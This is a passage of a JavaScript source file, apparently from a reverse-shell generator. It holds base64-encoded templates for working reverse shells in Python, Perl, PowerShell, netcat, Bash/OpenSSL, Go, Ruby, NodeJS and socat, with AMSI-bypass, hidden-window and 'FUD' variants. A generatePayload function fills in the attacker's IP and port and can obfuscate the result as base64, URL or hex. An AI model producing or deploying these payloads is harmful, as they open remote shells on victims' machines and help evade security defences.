    "template": "PCEtLSA6OyBweXRob24gLWMgJ2ltcG9ydCBzb2NrZXQsc3VicHJvY2VzcyxvcztzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsc29ja2V0LlNPQ0tfU1RSRUFNKTtzLmNvbm5lY3QoKCJ7aXB9Iix7cG9ydH0pKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOycgIyAtLT4=",
    "description": "HTML/Python Polyglot."
  },
  {
    "id": "perl-polyglot-132",
    "name": "Perl Polyglot",
    "os": "linux",
    "language": "perl",
    "tags": [
      "bypass",
      "polyglot"
    ],
    "template": "PCEtLSA6OyBwZXJsIC1lICd1c2UgU29ja2V0OyRpPSJ7aXB9IjskcD17cG9ydH07c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307JyAjIC0tPg==",
    "description": "HTML/Perl Polyglot."
  },
  {
    "id": "powershell-encoded-133",
    "name": "PowerShell Encoded",
    "os": "windows",
    "language": "powershell",
    "tags": [
      "bypass",
      "encoded"
    ],
    "template": "cG93ZXJzaGVsbCAtRW5jIHtiYXNlNjRfcGF5bG9hZH0=",
    "description": "Encoded PowerShell."
  },
  {
    "id": "powershell-hidden-134",
    "name": "PowerShell Hidden",
    "os": "windows",
    "language": "powershell",
    "tags": [
      "bypass",
      "hidden"
    ],
    "template": "cG93ZXJzaGVsbCAtdyBoaWRkZW4gLW5vcCAtYyAiLi4uIg==",
    "description": "Hidden Window."
  },
  {
    "id": "powershell-noprofile-135",
    "name": "PowerShell NoProfile",
    "os": "windows",
    "language": "powershell",
    "tags": [
      "bypass"
    ],
    "template": "cG93ZXJzaGVsbCAtbm9wIC1jICIuLi4i",
    "description": "No Profile."
  },
  {
    "id": "powershell-executionpolicy-136",
    "name": "PowerShell ExecutionPolicy",
    "os": "windows",
    "language": "powershell",
    "tags": [
      "bypass"
    ],
    "template": "cG93ZXJzaGVsbCAtZXAgYnlwYXNzIC1jICIuLi4i",
    "description": "Bypass Execution Policy."
  },
  {
    "id": "powershell-version-2-137",
    "name": "PowerShell Version 2",
    "os": "windows",
    "language": "powershell",
    "tags": [
      "bypass",
      "legacy"
    ],
    "template": "cG93ZXJzaGVsbCAtdiAyIC1jICIuLi4i",
    "description": "Downgrade to v2."
  },
  {
    "id": "nc-traditional-138",
    "name": "NC Traditional",
    "os": "linux",
    "language": "bash",
    "tags": [
      "bypass"
    ],
    "template": "bmMgLWUgL2Jpbi9iYXNoIHtpcH0ge3BvcnR9",
    "description": "Traditional NC."
  },
  {
    "id": "nc-openbsd-139",
    "name": "NC OpenBSD",
    "os": "linux",
    "language": "bash",
    "tags": [
      "bypass"
    ],
    "template": "cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMge2lwfSB7cG9ydH0gPi90bXAvZg==",
    "description": "OpenBSD NC."
  },
  {
    "id": "powershell-amsi-bypass-140",
    "name": "PowerShell AMSI Bypass",
    "os": "windows",
    "language": "powershell",
    "tags": [
      "premium",
      "bypass",
      "amsi"
    ],
    "template": "W1JlZl0uQXNzZW1ibHkuR2V0VHlwZSgnU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHMnKS5HZXRGaWVsZCgnYW1zaUluaXRGYWlsZWQnLCdOb25QdWJsaWMsU3RhdGljJykuU2V0VmFsdWUoJG51bGwsJHRydWUpOyAkY2xpZW50ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuVGNwQ2xpZW50KCd7aXB9Jyx7cG9ydH0pOyRzdHJlYW0gPSAkY2xpZW50LkdldFN0cmVhbSgpO1tieXRlW11dJGJ5dGVzID0gMC4uNjU1MzV8JXswfTt3aGlsZSgoJGkgPSAkc3RyZWFtLlJlYWQoJGJ5dGVzLCAwLCAkYnl0ZXMuTGVuZ3RoKSkgLW5lIDApezskZGF0YSA9IChOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uVGV4dC5BU0NJSUVuY29kaW5nKS5HZXRTdHJpbmcoJGJ5dGVzLDAsICRpKTskc2VuZGJhY2sgPSAoaWV4ICRkYXRhIDI+JjEgfCBPdXQtU3RyaW5nICk7JHNlbmRiYWNrMiA9ICRzZW5kYmFjayArICdQUyAnICsgKHB3ZCkuUGF0aCArICc+ICc7JHNlbmRieXRlID0gKFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkpLkdldEJ5dGVzKCRzZW5kYmFjazIpOyRzdHJlYW0uV3JpdGUoJHNlbmRieXRlLDAsJHNlbmRieXRlLkxlbmd0aCk7JHN0cmVhbS5GbHVzaCgpfTskY2xpZW50LkNsb3NlKCk=",
    "description": "Disables AMSI before execution."
  },
  {
    "id": "powershell-premium-ssl-141",
    "name": "PowerShell Premium SSL",
    "os": "windows",
    "language": "powershell",
    "tags": [
      "premium",
      "encrypted",
      "ssl"
    ],
    "template": "JHM9TmV3LU9iamVjdCBOZXQuU29ja2V0cy5UY3BDbGllbnQoJ3tpcH0nLHtwb3J0fSk7JHNzbD1OZXctT2JqZWN0IE5ldC5TZWN1cml0eS5Tc2xTdHJlYW0oJHMuR2V0U3RyZWFtKCksJGZhbHNlLCh7JHRydWV9IC1hcyBbTmV0LlNlY3VyaXR5LlJlbW90ZUNlcnRpZmljYXRlVmFsaWRhdGlvbkNhbGxiYWNrXSkpOyRzc2wuQXV0aGVudGljYXRlQXNDbGllbnQoJycpOyR3PU5ldy1PYmplY3QgSU8uU3RyZWFtV3JpdGVyKCRzc2wpOyR3LkF1dG9GbHVzaD0kdHJ1ZTtbYnl0ZVtdXSRiPTAuLjY1NTM1fCV7MH07d2hpbGUoKCRpPSRzc2wuUmVhZCgkYiwwLCRiLkxlbmd0aCkpLW5lIDApeyRkPShOZXctT2JqZWN0IFRleHQuQVNDSUlFbmNvZGluZykuR2V0U3RyaW5nKCRiLDAsJGkpOyRyPShpZXggJGQgMj4mMXxPdXQtU3RyaW5nKTskdy5Xcml0ZSgkcisnUFMgJysocHdkKS5QYXRoKyc+ICcpfQ==",
    "description": "Full SSL/TLS encrypted shell."
  },
  {
    "id": "python-premium-ssl-142",
    "name": "Python Premium SSL",
    "os": "linux",
    "language": "python",
    "tags": [
      "premium",
      "encrypted",
      "ssl"
    ],
    "template": "cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHNzbCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoIntpcH0iLHtwb3J0fSkpO3c9c3NsLndyYXBfc29ja2V0KHMpO29zLmR1cDIody5maWxlbm8oKSwwKTtvcy5kdXAyKHcuZmlsZW5vKCksMSk7b3MuZHVwMih3LmZpbGVubygpLDIpO3N1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKSc=",
    "description": "Python SSL wrapped socket."
  },
  {
    "id": "bash-premium-ssl-143",
    "name": "Bash Premium SSL",
    "os": "linux",
    "language": "bash",
    "tags": [
      "premium",
      "encrypted",
      "ssl"
    ],
    "template": "bWtmaWZvIC90bXAvczsgL2Jpbi9iYXNoIC1pIDwgL3RtcC9zIDI+JjEgfCBvcGVuc3NsIHNfY2xpZW50IC1xdWlldCAtY29ubmVjdCB7aXB9Ontwb3J0fSA+IC90bXAvczsgcm0gL3RtcC9z",
    "description": "Robust OpenSSL shell."
  },
  {
    "id": "go-premium-tls-144",
    "name": "Go Premium TLS",
    "os": "linux",
    "language": "go",
    "tags": [
      "premium",
      "encrypted",
      "tls"
    ],
    "template": "ZWNobyAncGFja2FnZSBtYWluO2ltcG9ydCJjcnlwdG8vdGxzIjtpbXBvcnQib3MvZXhlYyI7ZnVuYyBtYWluKCl7YyxfOj10bHMuRGlhbCgidGNwIiwie2lwfTp7cG9ydH0iLCZ0bHMuQ29uZmlne0luc2VjdXJlU2tpcFZlcmlmeTp0cnVlfSk7Y21kOj1leGVjLkNvbW1hbmQoIi9iaW4vc2giKTtjbWQuU3RkaW49YztjbWQuU3Rkb3V0PWM7Y21kLlN0ZGVycj1jO2NtZC5SdW4oKX0nID4gL3RtcC90LmdvICYmIGdvIHJ1biAvdG1wL3QuZ28gJiYgcm0gL3RtcC90Lmdv",
    "description": "Go TLS encrypted shell."
  },
  {
    "id": "ruby-premium-ssl-145",
    "name": "Ruby Premium SSL",
    "os": "linux",
    "language": "ruby",
    "tags": [
      "premium",
      "encrypted",
      "ssl"
    ],
    "template": "cnVieSAtcm5vcm1hbGl6ZWRfb3BlbnNzbCAtZSAnYz1PcGVuU1NMOjpTU0w6OlNTTFNvY2tldC5uZXcoVENQU29ja2V0Lm5ldygie2lwfSIse3BvcnR9KSkuY29ubmVjdDt3aGlsZShjbWQ9Yy5nZXRzKTtJTy5wb3BlbihjbWQsInIiKXt8aW98Yy5wcmludCBpby5yZWFkfWVuZCc=",
    "description": "Ruby SSL socket."
  },
  {
    "id": "perl-premium-ssl-146",
    "name": "Perl Premium SSL",
    "os": "linux",
    "language": "perl",
    "tags": [
      "premium",
      "encrypted",
      "ssl"
    ],
    "template": "cGVybCAtTUlPOjpTb2NrZXQ6OlNTTCAtZSAnJGM9SU86OlNvY2tldDo6U1NMLT5uZXcoUGVlckFkZHIsIntpcH06e3BvcnR9IixTU0xfdmVyaWZ5X21vZGUsU1NMX1ZFUklGWV9OT05FKTtTVERJTi0+ZmRvcGVuKCRjLHIpOyR+LT5mZG9wZW4oJGMsdyk7c3lzdGVtJF8gd2hpbGU8Pjsn",
    "description": "Perl SSL socket."
  },
  {
    "id": "nodejs-premium-ssl-147",
    "name": "NodeJS Premium SSL",
    "os": "linux",
    "language": "nodejs",
    "tags": [
      "premium",
      "encrypted",
      "ssl"
    ],
    "template": "KGZ1bmN0aW9uKCl7dmFyIHRscz1yZXF1aXJlKCd0bHMnKSxjcD1yZXF1aXJlKCdjaGlsZF9wcm9jZXNzJyksc2g9Y3Auc3Bhd24oJy9iaW4vc2gnLFtdKTt2YXIgY2xpZW50PXRscy5jb25uZWN0KHtwb3J0fSx7aG9zdDone2lwfScscmVqZWN0VW5hdXRob3JpemVkOmZhbHNlfSxmdW5jdGlvbigpe2NsaWVudC5waXBlKHNoLnN0ZGluKTtzaC5zdGRvdXQucGlwZShjbGllbnQpO3NoLnN0ZGVyci5waXBlKGNsaWVudCk7fSk7fSkoKTs=",
    "description": "NodeJS TLS connection."
  },
  {
    "id": "socat-premium-tty-148",
    "name": "Socat Premium TTY",
    "os": "linux",
    "language": "bash",
    "tags": [
      "premium",
      "stable",
      "socat"
    ],
    "template": "c29jYXQgZmlsZTpgdHR5YCxyYXcsZWNobz0wIG9wZW5zc2wtY29ubmVjdDp7aXB9Ontwb3J0fSx2ZXJpZnk9MA==",
    "description": "Socat Encrypted TTY."
  },
  {
    "id": "powershell-fud-149",
    "name": "PowerShell FUD",
    "os": "windows",
    "language": "powershell",
    "tags": [
      "premium",
      "fud",
      "obfuscated"
    ],
    "template": "cG93ZXJzaGVsbCAtbm9wIC13IGhpZGRlbiAtZSB7YmFzZTY0X3BheWxvYWR9",
    "description": "Base64 Encoded & Hidden Window."
  }
];

export const generatePayload = (shellId, ip, port, obfuscation = 'none') => {
  const shell = shells.find(s => s.id === shellId);
  if (!shell) return '';
  
  try {
    let payload = atob(shell.template);
    
    // Replace placeholders
    payload = payload.replace(/{ip}/g, ip)
                     .replace(/{port}/g, port)
                     .replace(/{server_port}/g, '8000'); // Default server port for downloads

    // Apply obfuscation
    if (obfuscation === 'base64') {
      return btoa(payload);
    } else if (obfuscation === 'url') {
      return encodeURIComponent(payload);
    } else if (obfuscation === 'hex') {
      let hex = '';
      for (let i = 0; i < payload.length; i++) {
        hex += '%' + payload.charCodeAt(i).toString(16).toUpperCase();
      }
      return hex;
    }
    
    return payload;
  } catch (e) {
    console.error('Failed to decode/obfuscate payload', e);
    return 'Error generating payload';
  }
};
